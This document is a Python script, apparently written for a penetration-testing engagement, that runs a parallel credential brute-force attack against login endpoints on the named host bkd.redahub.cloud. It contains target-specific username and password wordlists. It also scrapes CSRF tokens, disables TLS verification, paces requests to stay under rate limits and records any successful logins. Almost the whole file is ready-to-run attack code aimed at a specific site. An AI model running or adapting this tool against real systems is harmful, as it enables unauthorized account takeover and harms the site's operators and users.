#!/usr/bin/env python3
"""
MULTI-ENDPOINT PARALLEL BRUTEFORCE - REDAHUB
Target: bkd.redahub.cloud
Author: Neural-OffSec-Team
Date: 15-11-2025 17:54 BRT
Engagement: REDAHUB-web-wildcard
CVSS: 9.8 CRITICAL (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

ESTRATÃ‰GIA:
- 5 threads paralelos atacando diferentes endpoints
- Custom wordlist REDAHUB-specific
- Multiple username variations
- Multiple authentication methods
- Rate limit aware (delays adaptativos)
- Auto-save results
- CSRF handling automÃ¡tico
"""

import requests
import re
import time
import json
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Tuple, Optional
from datetime import datetime
from threading import Lock

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class MultiEndpointBruteforce:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.results_lock = Lock()
        self.success_results = []
        self.tested_count = 0
        self.start_time = time.time()

        # Headers comuns
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Accept': 'application/json, text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        }

        # Endpoints para testar
        self.endpoints = [
            {
                'url': '/admin/login/',
                'method': 'POST',
                'content_type': 'application/x-www-form-urlencoded',
                'username_field': 'username',
                'password_field': 'password',
                'csrf_required': True,
                'success_indicators': ['csrfmiddlewaretoken', 'dashboard', 'Site administration']
            },
            {
                'url': '/api/auth/login/',
                'method': 'POST',
                'content_type': 'application/json',
                'username_field': 'email',
                'password_field': 'password',
                'csrf_required': False,
                'success_indicators': ['token', 'access', 'refresh', 'session']
            },
            {
                'url': '/api/users/login',
                'method': 'POST',
                'content_type': 'application/json',
                'username_field': 'username',
                'password_field': 'password',
                'csrf_required': False,
                'success_indicators': ['token', 'success', 'user']
            },
            {
                'url': '/api/login',
                'method': 'POST',
                'content_type': 'application/json',
                'username_field': 'username',
                'password_field': 'password',
                'csrf_required': False,
                'success_indicators': ['token', 'authenticated']
            },
        ]

        # Usernames para testar
        self.usernames = [
            'admin@redahub.cloud',
            'admin@redahub.com.br',
            'administrator@redahub.cloud',
            'superuser@redahub.cloud',
            'tech@redahub.cloud',
            'support@redahub.cloud',
            'contato@redahub.cloud',
            'info@redahub.cloud',
            'admin',
            'administrator',
            'superuser',
            'root',
        ]

        # Custom wordlist REDAHUB-specific (top 50 senhas)
        self.passwords = [
            # REDAHUB variations
            'RedaHub2024!',
            'Redahub@2024',
            'Redahub123!',
            'RedahubEditorial',
            'RedahubEditorialSystems',
            'EditorialRedahub',
            'Redahub#2024',
            'Redahub@Admin',
            'AdminRedahub2024',
            'Redahub!@#$',
            'RedahubSecure',
            'SystemsEditorial',
            'Redahub@Editorial',
            'EditorialSystems2024',
            'AdminPanel2024',
            'RedaHub@123',
            'Redahub2025',
            'Editorial@2024',

            # Common strong passwords
            'P@ssw0rd!',
            'P@ssword123!',
            'Admin@123!',
            'Admin@2024!',
            'Secure123!@#',
            'Admin@Redahub',
            'StrongPassword123!',
            'Welcome@2024!',
            'Change@Me123!',

            # Common weak passwords
            'password',
            'admin',
            'admin123',
            'password123',
            '123456',
            'admin@123',
            'P@ssw0rd',
            'qwerty123',
            'letmein',
            '12345678',

            # Default Django
            'pbkdf2_sha256',
            'django',
            'django123',
            'djangoadmin',

            # Brazilian specific
            'senha123',
            'senha@123',
            'Admin@123',
            'Mudar@123',
        ]

    def log(self, message: str, level: str = "INFO"):
        """Thread-safe logging"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        elapsed = int(time.time() - self.start_time)
        print(f"[{timestamp}] [{elapsed}s] [{level}] {message}")

    def get_csrf_token(self, url: str) -> Optional[str]:
        """Extrai CSRF token de uma pÃ¡gina"""
        try:
            resp = self.session.get(url, headers=self.headers, timeout=10, verify=False)

            # Tenta extrair do HTML
            match = re.search(r'name=["\']csrfmiddlewaretoken["\'] value=["\']([^"\']+)["\']', resp.text)
            if match:
                return match.group(1)

            # Tenta extrair do cookie
            if 'csrftoken' in self.session.cookies:
                return self.session.cookies['csrftoken']

        except Exception as e:
            self.log(f"Erro ao obter CSRF token: {e}", "ERROR")

        return None

    def test_credential(self, endpoint: Dict, username: str, password: str) -> Optional[Dict]:
        """Testa uma credencial em um endpoint especÃ­fico"""
        try:
            url = self.base_url + endpoint['url']

            # Prepara dados de login
            if endpoint['content_type'] == 'application/json':
                data = {
                    endpoint['username_field']: username,
                    endpoint['password_field']: password
                }
                payload = json.dumps(data)
                headers = self.headers.copy()
                headers['Content-Type'] = 'application/json'
            else:
                # Form-encoded
                csrf_token = None
                if endpoint.get('csrf_required'):
                    csrf_token = self.get_csrf_token(url)

                data = {
                    endpoint['username_field']: username,
                    endpoint['password_field']: password
                }
                if csrf_token:
                    data['csrfmiddlewaretoken'] = csrf_token

                payload = data
                headers = self.headers.copy()
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                if csrf_token:
                    headers['X-CSRFToken'] = csrf_token

            # Faz requisiÃ§Ã£o
            resp = self.session.request(
                endpoint['method'],
                url,
                data=payload if endpoint['content_type'] != 'application/json' else None,
                json=data if endpoint['content_type'] == 'application/json' else None,
                headers=headers,
                timeout=10,
                verify=False,
                allow_redirects=False
            )

            # Incrementa contador
            with self.results_lock:
                self.tested_count += 1

            # Verifica sucesso
            success = False
            reason = ""

            # Check 1: Status code 200 ou 302 (redirect)
            if resp.status_code in [200, 302]:
                # Check 2: Success indicators no response
                for indicator in endpoint['success_indicators']:
                    if indicator.lower() in resp.text.lower():
                        success = True
                        reason = f"Indicator '{indicator}' found in response"
                        break

                # Check 3: Redirect para pÃ¡gina interna (nÃ£o volta para /login)
                if resp.status_code == 302:
                    location = resp.headers.get('Location', '')
                    if location and 'login' not in location.lower():
                        success = True
                        reason = f"Redirect to {location}"

            # Check 4: NÃ£o tem erro explÃ­cito
            error_indicators = [
                'invalid', 'incorrect', 'wrong', 'failed', 'error',
                'invÃ¡lid', 'incorreto', 'errado', 'falhou', 'erro'
            ]
            for error in error_indicators:
                if error in resp.text.lower():
                    success = False
                    break

            if success:
                result = {
                    'endpoint': endpoint['url'],
                    'username': username,
                    'password': password,
                    'status_code': resp.status_code,
                    'reason': reason,
                    'response_length': len(resp.text),
                    'timestamp': datetime.now().isoformat()
                }

                with self.results_lock:
                    self.success_results.append(result)

                self.log(f"ğŸ”¥ SUCCESS! {endpoint['url']} - {username}:{password} - {reason}", "SUCCESS")
                return result

            # Rate limit detection
            if resp.status_code == 429 or 'too many' in resp.text.lower():
                self.log(f"Rate limit detected on {endpoint['url']}, sleeping 5s", "WARNING")
                time.sleep(5)

        except requests.exceptions.Timeout:
            self.log(f"Timeout on {endpoint['url']} for {username}", "WARNING")
        except Exception as e:
            self.log(f"Error testing {endpoint['url']}: {str(e)[:50]}", "ERROR")

        return None

    def attack_endpoint(self, endpoint: Dict) -> List[Dict]:
        """Ataca um endpoint com todas as credenciais"""
        self.log(f"Starting attack on {endpoint['url']}")
        results = []

        for username in self.usernames:
            for password in self.passwords:
                result = self.test_credential(endpoint, username, password)
                if result:
                    results.append(result)

                # Adaptive delay (0.5-2s para evitar rate limit)
                time.sleep(0.8)

        self.log(f"Finished attack on {endpoint['url']}")
        return results

    def run_parallel_attack(self, max_workers: int = 4):
        """Executa ataque paralelo em mÃºltiplos endpoints"""
        self.log(f"Starting parallel bruteforce on {len(self.endpoints)} endpoints")
        self.log(f"Testing {len(self.usernames)} usernames Ã— {len(self.passwords)} passwords = {len(self.usernames) * len(self.passwords)} combinations per endpoint")
        self.log(f"Total combinations: {len(self.endpoints) * len(self.usernames) * len(self.passwords)}")

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.attack_endpoint, endpoint): endpoint for endpoint in self.endpoints}

            for future in as_completed(futures):
                endpoint = futures[future]
                try:
                    results = future.result()
                    if results:
                        self.log(f"Endpoint {endpoint['url']} yielded {len(results)} successful logins!", "SUCCESS")
                except Exception as e:
                    self.log(f"Exception on {endpoint['url']}: {e}", "ERROR")

        self.log(f"Parallel attack completed. Total tested: {self.tested_count}")

    def save_results(self):
        """Salva resultados em arquivo"""
        timestamp = datetime.now().strftime("%d-%m_%H-%M")
        filename = f"/Users/th3_w6rst/Neural-OffSec-Team/clients/REDAHUB/2025-11-06-REDAHUB-web-wildcard/03-exploitation/{timestamp}_bruteforce-results.json"

        report = {
            'timestamp': datetime.now().isoformat(),
            'target': self.base_url,
            'total_tested': self.tested_count,
            'total_success': len(self.success_results),
            'duration_seconds': int(time.time() - self.start_time),
            'successes': self.success_results
        }

        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)

        self.log(f"Results saved to {filename}")

        # Print summary
        print("\n" + "="*80)
        print("BRUTEFORCE SUMMARY")
        print("="*80)
        print(f"Total combinations tested: {self.tested_count}")
        print(f"Successful logins found: {len(self.success_results)}")
        print(f"Duration: {int(time.time() - self.start_time)} seconds")

        if self.success_results:
            print("\nğŸ”¥ SUCCESSFUL CREDENTIALS:")
            for result in self.success_results:
                print(f"\n  Endpoint: {result['endpoint']}")
                print(f"  Username: {result['username']}")
                print(f"  Password: {result['password']}")
                print(f"  Reason: {result['reason']}")
        else:
            print("\nâŒ No successful credentials found.")

        print("="*80 + "\n")

def main():
    print("""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  MULTI-ENDPOINT PARALLEL BRUTEFORCE - REDAHUB                    â•‘
â•‘  Target: bkd.redahub.cloud                                       â•‘
â•‘  Strategy: 4 parallel threads Ã— multiple endpoints              â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """)

    target = "https://bkd.redahub.cloud"

    bruteforcer = MultiEndpointBruteforce(target)

    try:
        bruteforcer.run_parallel_attack(max_workers=4)
    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted by user")
    finally:
        bruteforcer.save_results()

if __name__ == "__main__":
    main()
